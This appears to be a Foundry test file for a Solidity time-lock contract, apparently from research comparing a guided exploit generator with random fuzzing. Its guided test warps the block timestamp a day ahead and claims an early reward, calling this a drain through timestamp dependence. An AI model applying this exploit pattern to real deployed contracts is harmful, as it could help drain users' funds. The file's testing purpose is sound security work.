// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../src/TimestampLock.sol";

interface Vm {
    function deal(address who, uint256 newBalance) external;
    function warp(uint256 newTimestamp) external;
}

contract TimestampLockTest {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    TimestampLock lockContract;

    function setUp() public {
        vm.warp(1700000000);
        lockContract = (new TimestampLock){value: 1 ether}();
        vm.deal(address(this), 1 ether);
    }

    // [Mode B: PRISM Guided Exploit Generator]
    // Exploits timestamp dependence via block.timestamp boundary manipulation
    function testGuidedExploit() public {
        // Manipulate timestamp past unlock deadline (miner timestamp tolerance)
        vm.warp(1700000000 + 1 days);
        uint256 balBefore = address(this).balance;
        lockContract.claimEarlyReward();
        uint256 balAfter = address(this).balance;
        // Invariant Violation: Early reward drained via timestamp dependence
        require(balAfter > balBefore, "Timestamp lock extracted via timestamp manipulation");
    }

    // [Mode A: Baseline Unconstrained Random Fuzzing]
    // Unconstrained random calls across arbitrary parameter space without timestamp warp
    function testRandomFuzz(uint256 randomSalt) public {
        vm.warp(1700000000); // Reset to active lock period
        if (randomSalt == 0) return;
        
        // Random execution during lock period reverts
        try lockContract.claimEarlyReward() {
            revert("Should not unlock during active lock period");
        } catch {
            // Expected revert: lock period still active
        }
        
        // Invariant: Funds remain safely locked under unconstrained caller interactions
        require(address(lockContract).balance == 1 ether, "Funds remain locked under random interaction");
    }

    receive() external payable {}
}
